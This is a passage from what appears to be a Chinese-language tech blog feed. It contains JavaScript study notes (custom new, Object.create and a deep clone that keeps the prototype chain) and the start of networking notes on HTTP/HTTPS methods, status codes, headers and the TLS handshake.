href="#10-1-手写-new-操作符实现" class="headerlink" title="10.1 手写 new 操作符实现"></a>10.1 手写 <code>new</code> 操作符实现</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myNew</span>(<span class="hljs-params">Constructor, ...args</span>) &#123;<br>  <span class="hljs-comment">// 验证输入</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Constructor</span> !== <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">&#x27;First argument must be a function&#x27;</span>);<br>  &#125;<br>  <br>  <span class="hljs-comment">// 创建新对象并设置原型</span><br>  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br>  <br>  <span class="hljs-comment">// 执行构造函数</span><br>  <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Constructor</span>.<span class="hljs-title function_">apply</span>(obj, args);<br>  <br>  <span class="hljs-comment">// 处理返回值</span><br>  <span class="hljs-keyword">return</span> (result &amp;&amp; (<span class="hljs-keyword">typeof</span> result === <span class="hljs-string">&#x27;object&#x27;</span> || <span class="hljs-keyword">typeof</span> result === <span class="hljs-string">&#x27;function&#x27;</span>))<br>    ? result <br>    : obj;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-2-手写-Object-create"><a href="#10-2-手写-Object-create" class="headerlink" title="10.2 手写 Object.create"></a>10.2 手写 <code>Object.create</code></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myObjectCreate</span>(<span class="hljs-params">proto</span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> proto !== <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; <span class="hljs-keyword">typeof</span> proto !== <span class="hljs-string">&#x27;function&#x27;</span> &amp;&amp; proto !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">&#x27;Object prototype may only be an Object or null&#x27;</span>);<br>  &#125;<br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">F</span>(<span class="hljs-params"></span>) &#123;&#125;<br>  F.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = proto;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">F</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> parent = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Parent&#x27;</span> &#125;;<br><span class="hljs-keyword">const</span> child = <span class="hljs-title function_">myObjectCreate</span>(parent);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child.<span class="hljs-property">name</span>); <span class="hljs-comment">// &#x27;Parent&#x27;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(child) === parent); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h2 id="10-3-如何实现一个完美的深拷贝（处理原型链）"><a href="#10-3-如何实现一个完美的深拷贝（处理原型链）" class="headerlink" title="10.3 如何实现一个完美的深拷贝（处理原型链）"></a>10.3 如何实现一个完美的深拷贝（处理原型链）</h2><p><strong>完整代码</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deepClone</span>(<span class="hljs-params">source, map = <span class="hljs-keyword">new</span> <span class="hljs-built_in">WeakMap</span>()</span>) &#123;<br>  <span class="hljs-comment">// 处理基本类型和函数</span><br>  <span class="hljs-keyword">if</span> (source === <span class="hljs-literal">null</span> || <span class="hljs-keyword">typeof</span> source !== <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> source;<br>  &#125;<br><br>  <span class="hljs-comment">// 处理循环引用</span><br>  <span class="hljs-keyword">if</span> (map.<span class="hljs-title function_">has</span>(source)) &#123;<br>    <span class="hljs-keyword">return</span> map.<span class="hljs-title function_">get</span>(source);<br>  &#125;<br><br>  <span class="hljs-comment">// 获取原型</span><br>  <span class="hljs-keyword">const</span> proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(source);<br>  <br>  <span class="hljs-comment">// 处理特殊对象类型</span><br>  <span class="hljs-keyword">if</span> (source <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Date</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(source);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (source <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">RegExp</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(source);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (source <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Map</span>) &#123;<br>    <span class="hljs-keyword">const</span> cloneMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br>    map.<span class="hljs-title function_">set</span>(source, cloneMap);<br>    source.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">value, key</span>) =&gt;</span> &#123;<br>      cloneMap.<span class="hljs-title function_">set</span>(<span class="hljs-title function_">deepClone</span>(key, map), <span class="hljs-title function_">deepClone</span>(value, map));<br>    &#125;);<br>    <span class="hljs-keyword">return</span> cloneMap;<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (source <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Set</span>) &#123;<br>    <span class="hljs-keyword">const</span> cloneSet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();<br>    map.<span class="hljs-title function_">set</span>(source, cloneSet);<br>    source.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> &#123;<br>      cloneSet.<span class="hljs-title function_">add</span>(<span class="hljs-title function_">deepClone</span>(value, map));<br>    &#125;);<br>    <span class="hljs-keyword">return</span> cloneSet;<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (source <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">ArrayBuffer</span>) &#123;<br>    <span class="hljs-keyword">return</span> source.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">ArrayBuffer</span>.<span class="hljs-title function_">isView</span>(source)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> source.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span><br><span class="hljs-params">      source.buffer.slice(<span class="hljs-number">0</span>),</span><br><span class="hljs-params">      source.byteOffset,</span><br><span class="hljs-params">      source.byteLength</span><br><span class="hljs-params">    </span>);<br>  &#125;<br><br>  <span class="hljs-comment">// 创建目标对象并保留原型链</span><br>  <span class="hljs-keyword">let</span> target;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(source)) &#123;<br>    target = <span class="hljs-keyword">new</span> proto.<span class="hljs-title function_">constructor</span>(<span class="hljs-params">source.length</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    target = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(proto);<br>  &#125;<br>  <br>  <span class="hljs-comment">// 记录已拷贝对象</span><br>  map.<span class="hljs-title function_">set</span>(source, target);<br><br>  <span class="hljs-comment">// 处理Symbol属性</span><br>  <span class="hljs-keyword">const</span> symbolKeys = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(source);<br>  <span class="hljs-keyword">const</span> allKeys = [...<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(source), ...symbolKeys];<br>  <br>  <span class="hljs-comment">// 递归拷贝所有属性</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">of</span> allKeys) &#123;<br>    <span class="hljs-comment">// 跳过原型属性</span><br>    <span class="hljs-keyword">if</span> (!source.<span class="hljs-title function_">hasOwnProperty</span>(key)) <span class="hljs-keyword">continue</span>;<br>    <br>    <span class="hljs-comment">// 处理属性描述符</span><br>    <span class="hljs-keyword">const</span> descriptor = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(source, key);<br>    <span class="hljs-keyword">if</span> (descriptor &amp;&amp; !descriptor.<span class="hljs-property">enumerable</span>) <span class="hljs-keyword">continue</span>;<br>    <br>    target[key] = <span class="hljs-title function_">deepClone</span>(source[key], map);<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> target;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>使用示例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 测试原型链保持</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">greet</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>;<br>&#125;;<br><br><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><span class="hljs-keyword">const</span> clonedPerson = <span class="hljs-title function_">deepClone</span>(person);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-title function_">greet</span>()); <span class="hljs-comment">// &quot;Hello, Alice&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(clonedPerson.<span class="hljs-title function_">greet</span>()); <span class="hljs-comment">// &quot;Hello, Alice&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(clonedPerson) === <span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// 测试循环引用</span><br><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> &#125;;<br>obj.<span class="hljs-property">self</span> = obj;<br><span class="hljs-keyword">const</span> clonedObj = <span class="hljs-title function_">deepClone</span>(obj);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(clonedObj.<span class="hljs-property">self</span> === clonedObj); <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// 测试特殊对象</span><br><span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>([[<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>]]);<br><span class="hljs-keyword">const</span> clonedMap = <span class="hljs-title function_">deepClone</span>(map);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(clonedMap.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;key&#x27;</span>)); <span class="hljs-comment">// &#x27;value&#x27;</span><br><br><span class="hljs-keyword">const</span> date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br><span class="hljs-keyword">const</span> clonedDate = <span class="hljs-title function_">deepClone</span>(date);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(clonedDate.<span class="hljs-title function_">getTime</span>() === date.<span class="hljs-title function_">getTime</span>()); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>关键特性</strong></p><ul><li>原型链保留：<ul><li>使用 Object.create(proto) 创建对象</li><li>保持原型链不变</li></ul></li><li>循环引用处理：<ul><li>使用 WeakMap 跟踪已拷贝对象</li><li>避免无限递归</li></ul></li><li>全面类型支持：<ul><li>基本类型</li><li>对象&#x2F;数组</li><li>函数（直接引用）</li><li>Date&#x2F;RegExp</li><li>Map&#x2F;Set</li><li>ArrayBuffer&#x2F;TypedArray</li><li>Symbol 属性</li></ul></li><li>属性描述符处理：<ul><li>跳过不可枚举属性</li><li>保留属性特性</li></ul></li><li>性能优化：<ul><li>使用 WeakMap 避免内存泄漏</li><li>最小化属性遍历</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络知识专题学习</title>
    <link href="/2025/06/20/Network%20Study%20Notes/"/>
    <url>/2025/06/20/Network%20Study%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="一、基础网络协议"><a href="#一、基础网络协议" class="headerlink" title="一、基础网络协议"></a>一、基础网络协议</h1><h2 id="1-1-HTTP-HTTPS协议核心"><a href="#1-1-HTTP-HTTPS协议核心" class="headerlink" title="1.1 HTTP&#x2F;HTTPS协议核心"></a>1.1 HTTP&#x2F;HTTPS协议核心</h2><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p><strong>定义</strong></p><p>HTTP（HyperText Transfer Protocol）是应用层协议，基于 请求-响应 模型，用于客户端（浏览器）与服务器之间的数据传输，默认端口 80</p><p><strong>核心特性</strong></p><ul><li>无状态：每个请求独立，服务器不保留客户端上下文（状态管理依赖 Cookie 和 Session）</li><li>明文传输：请求与响应内容以未加密的文本形式传输</li><li>常用方法：<ul><li>GET：获取资源</li><li>POST：提交数据</li><li>PUT：更新资源</li><li>DELETE：删除资源</li></ul></li></ul><span id="more"></span><p><strong>报文结构</strong></p><p>请求报文：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Text">GET /index.html HTTP/1.1<br>Host: www.example.com<br>User-Agent: Mozilla/5.0<br></code></pre></td></tr></table></figure><p>响应报文：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Text">HTTP/1.1 200 OK<br>Content-Type: text/html<br>&lt;html&gt;...&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="HTTPS协议"><a href="#HTTPS协议" class="headerlink" title="HTTPS协议"></a>HTTPS协议</h3><p><strong>定义</strong></p><p>HTTPS（HTTP secure）&#x3D; HTTP + TSL&#x2F;SSL 加密层，在传输层对 HTTP 数据进行加密，默认端口 443</p><p><strong>核心机制</strong></p><p>加密原理：</p><ul><li>非对称加密：使用公钥&#x2F;私钥对协商会话密钥（如 RSA 算法）</li><li>对称加密：后续通信使用协商的会话密钥高效加密数据（如 AES 算法）</li></ul><p>身份验证：依赖数字证书（由 CA 颁发）验证服务器身份，防止中间人攻击</p><p><strong>工作流程</strong></p><ol><li>客户端发起 HTTPS 请求（clienthello）</li><li>服务器返回数字证书（含公钥）</li><li>客户端验证证书有效性（CA 链、有效期等）</li><li>客户端生成会话密钥，用公钥加密后发送给服务器</li><li>双方使用会话密钥进行对称加密通信</li></ol><p><strong>核心优势</strong></p><ul><li>数据保密：加密传输，防窃听</li><li>数据完整：防篡改（MAC 校验）</li><li>身份认证：验证服务器真实性</li></ul><h3 id="HTTP请求方法（GET-POST-PUT-DELETE）与状态码（200-301-404-500）"><a href="#HTTP请求方法（GET-POST-PUT-DELETE）与状态码（200-301-404-500）" class="headerlink" title="HTTP请求方法（GET&#x2F;POST&#x2F;PUT&#x2F;DELETE）与状态码（200&#x2F;301&#x2F;404&#x2F;500）"></a>HTTP请求方法（GET&#x2F;POST&#x2F;PUT&#x2F;DELETE）与状态码（200&#x2F;301&#x2F;404&#x2F;500）</h3><p><strong>HTTP 请求方法</strong></p><table><thead><tr><th align="left">方法</th><th align="left">核心特性</th><th align="left">典型应用场景</th><th align="left">幂等性</th><th align="left">安全性</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">从服务器获取资源，参数通过URL传递（长度受限）</td><td align="left">加载页面、查询数据</td><td align="left">是</td><td align="left">是</td></tr><tr><td align="left">POST</td><td align="left">向服务器提交数据（请求体承载数据），可能修改服务器状态</td><td align="left">表单提交、文件上传、登录操作</td><td align="left">否</td><td align="left">否</td></tr><tr><td align="left">PUT</td><td align="left">完整更新服务器资源（需提交完整新数据）</td><td align="left">更新用户资料、替换整个文档</td><td align="left">是</td><td align="left">否</td></tr><tr><td align="left">DELETE</td><td align="left">删除服务器指定资源</td><td align="left">删除文章、移除用户账户</td><td align="left">是</td><td align="left">否</td></tr></tbody></table><ul><li>幂等性：多次相同请求效果 &#x3D; 一次请求（GET&#x2F;PUT&#x2F;DELETE 是，POST 不是）</li><li>安全性：是否修改服务器资源（仅 GET 是安全的）</li></ul><p><strong>HTTP 状态码</strong></p><table><thead><tr><th align="left">状态码</th><th align="left">类别</th><th align="left">核心含义</th><th align="left">典型触发场景</th></tr></thead><tbody><tr><td align="left">200</td><td align="left">成功 (2xx)</td><td align="left">OK - 请求成功处理</td><td align="left">页面正常加载、API返回有效数据</td></tr><tr><td align="left">301</td><td align="left">重定向 (3xx)</td><td align="left">Moved Permanently - 资源永久迁移（浏览器自动缓存新地址）</td><td align="left">网站域名变更、旧URL废弃（SEO权重转移）</td></tr><tr><td align="left">404</td><td align="left">客户端错误(4xx)</td><td align="left">Not Found - 请求资源不存在</td><td align="left">URL路径错误、静态资源被删除</td></tr><tr><td align="left">500</td><td align="left">服务器错误(5xx)</td><td align="left">Internal Server Error - 服务器内部处理失败</td><td align="left">后端代码异常、数据库连接故障</td></tr></tbody></table><h3 id="HTTP报文结构（请求行、请求头、请求体）"><a href="#HTTP报文结构（请求行、请求头、请求体）" class="headerlink" title="HTTP报文结构（请求行、请求头、请求体）"></a>HTTP报文结构（请求行、请求头、请求体）</h3><p><strong>请求报文结构</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Text">[请求行]<br>[请求头]<br>[空行]<br>[请求体]<br></code></pre></td></tr></table></figure><p><strong>请求行（Request Line）</strong></p><ul><li>格式：<code>[方法] [URL路径] [协议版本]</code>（<code>GET /index.html HTTP/1.1</code>）</li><li>核心要素：<ul><li>方法：<code>GET/POST/PUT/DELETE</code>等</li><li>URL 路径：资源路径，不包含域名</li><li>协议版本：<code>HTTP/1.1</code> 或 <code>HTTP/2</code></li></ul></li></ul><p><strong>请求头（Request Headers）</strong></p><ul><li>格式：<code>Header-Name: value</code>（<code>Host: www.example.com</code>）</li><li>关键字段：<ul><li>HOST：目标域名（HTTP&#x2F;1.1 必需）</li><li>User-Agent：客户端标识</li><li>Content-type：请求媒体类型</li><li>Cookie：会话状态</li></ul></li></ul><p><strong>请求体（Request Body）</strong></p><ul><li>位置：空行之后</li><li>内容：<ul><li>GET 请求通常无请求体</li><li>POST&#x2F;PUT 请求包含数据</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure></li><li>格式依赖：由 <code>Content-Type</code> 请求头指定</li></ul><p><strong>响应报文结构</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Text">[状态行]<br>[响应头]<br>[空行]<br>[响应体]<br></code></pre></td></tr></table></figure><p><strong>状态行（Status Line）</strong></p><ul><li>格式：<code>[协议版本] [状态码] [状态文本]</code>（<code>HTTP/1.1 200 OK</code>）</li></ul><p><strong>响应头（Response Headers）</strong></p><ul><li>格式：<code>Header-Name: value</code>（<code>Cache-Control: nocache</code>）</li><li>关键字段：<ul><li>Content-type：响应体类型（如 text&#x2F;html）</li><li>Cache-Control：缓存策略</li><li>Set-Cookie：会话状态</li></ul></li></ul><p><strong>响应体（Response Body）</strong></p><ul><li>内容：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;html&gt;...&lt;/html&gt;<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;value&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="请求-响应头结构（Content-Type-Cache-Control-Authorization）"><a href="#请求-响应头结构（Content-Type-Cache-Control-Authorization）" class="headerlink" title="请求&#x2F;响应头结构（Content-Type&#x2F;Cache-Control&#x2F;Authorization）"></a>请求&#x2F;响应头结构（Content-Type&#x2F;Cache-Control&#x2F;Authorization）</h3><p><strong>HTTP 头部核心结构</strong></p><p>HTTP 头是键值对集合（不区分大小写），位于请求&#x2F;响应报文起始行之后，空行之前，格式如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Text">Header-Name: value1, value2<br></code></pre></td></tr></table></figure><p><strong>核心请求&#x2F;响应头详解</strong></p><p>（1）content-Type</p><ul><li>作用：设置请求&#x2F;响应主体的媒体类型（MIME 类型）和编码格式</li><li>请求头示例：Content-Type: application&#x2F;json; charset&#x3D;utf-8<ul><li>application&#x2F;json：JSON 格式数据</li><li>charset&#x3D;utf-8：字符编码</li></ul></li><li>响应头示例：Content-Type: text&#x2F;html; charset&#x3D;UTF-8</li><li>前端关键场景：<ul><li>提交表单时需设置：application&#x2F;x-www-form-urlencoded（默认）或multipart&#x2F;form-data（文件上传）</li><li>调用 API 时需与服务端协商：application&#x2F;json（RESTful API 规范）</li></ul></li></ul><p>（2）Cache-Control</p><ul><li>作用：控制资源的缓存机制（请求&#x2F;响应中均可使用），优先级高于 <code>Expires</code></li><li>常用指令：</li></ul><table><thead><tr><th align="left">指令</th><th align="left">请求头用途</th><th align="left">响应头用途</th></tr></thead><tbody><tr><td align="left">max-age&#x3D;3600</td><td align="left">-</td><td align="left">资源有效期（秒）</td></tr><tr><td align="left">no-cache</td><td align="left">要求服务器验证缓存有效性</td><td align="left">允许缓存但每次需验证</td></tr><tr><td align="left">no-store</td><td align="left">禁止任何缓存</td><td align="left">禁止任何缓存</td></tr><tr><td align="left">public</td><td align="left">-</td><td align="left">允许所有环境缓存（CDN&#x2F;代理）</td></tr><tr><td align="left">private</td><td align="left">-</td><td align="left">仅允许浏览器缓存</td></tr></tbody></table><ul><li>前端优化实践：</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Text"># 静态资源长期缓存<br>Cache-Control: public, max-age=31536000, immutable<br></code></pre></td></tr></table></figure><p>（3）Authorization</p><ul><li>作用：在请求头中携带客户端身份凭证，用于访问受保护资源</li><li>典型格式：<code>Authorization: &lt;认证类型&gt; &lt;凭证&gt;</code><ul><li>Bearer Token（JWT标准）：<code>Authorization: Bearer eyJhbGci...</code></li><li>Basic Auth：<code>Authorization: Basic base64(username:password)</code></li></ul></li><li>安全要求：<ul><li>必须通过 HTTPS 传输（防止凭证泄露）</li><li>前端存储敏感凭证需使用 <code>HttpOnly Cookie</code> 或安全存储（Secure Storage）</li></ul></li></ul><h3 id="HTTPS加密原理（SSL-TLS握手、证书验证）"><a href="#HTTPS加密原理（SSL-TLS握手、证书验证）" class="headerlink" title="HTTPS加密原理（SSL&#x2F;TLS握手、证书验证）"></a>HTTPS加密原理（SSL&#x2F;TLS握手、证书验证）</h3><p><strong>核心原理</strong></p><p>本质是 HTTP + TLS&#x2F;SSL 加密层（传输层安全协议），通过混合加密体系保障安全</p><p><strong>TLS&#x2F;SSL 握手过程</strong></p><table><thead><tr><th align="left">步骤</th><th align="left">关键动作</th><th align="left">加密技术应用</th></tr></thead><tbody><tr><td align="left">ClientHello</td><td align="left">客户端发送：支持的 TLS 版本 + 加密套件列表 + 随机数 A</td><td align="left">-</td></tr><tr><td align="left">ServerHello</td><td align="left">服务器响应：选定的 TLS 版本和加密套件 + 随机数 B + 数字证书（含公钥）</td><td align="left">非对称加密基础</td></tr><tr><td align="left">证书验证</td><td align="left">客户端验证证书：颁发机构（CA）可信性 + 域名匹配 + 有效期 + 证书链完整性</td><td align="left">数字签名技术</td></tr><tr><td align="left">交换密钥</td><td align="left">客户端：生成预主密钥，使用公钥加密预主密钥并发送给服务器</td><td align="left">非对称加密（RSA&#x2F;ECC）</td></tr><tr><td align="left">生成会话密钥</td><td align="left">双方使用随机数 A&#x2F;B + 预主密钥计算会话密钥</td><td align="left">密钥派生函数</td></tr><tr><td align="left">加密通信就绪</td><td align="left">双方交换<code>Finished</code>消息验证密钥正确性，后续通信使用会话密钥对称加密</td><td align="left">对称加密</td></tr></tbody></table><p>流程图如下：</p><pre class="mermaid">sequenceDiagram    participant Client    participant Server    Client->>Server: ClientHello (TLS版本 + 加密套件 + 随机数A)    Server->>Client: ServerHello (加密套件 + 随机数B) + 证书    Note right of Client: 证书验证 (CA链/域名/有效期)    Client->>Server: 加密的预主密钥 (用服务器公钥)    Note left of Server: 生成会话密钥 (随机数A+B+预主密钥)    Server->>Client: [Finished]    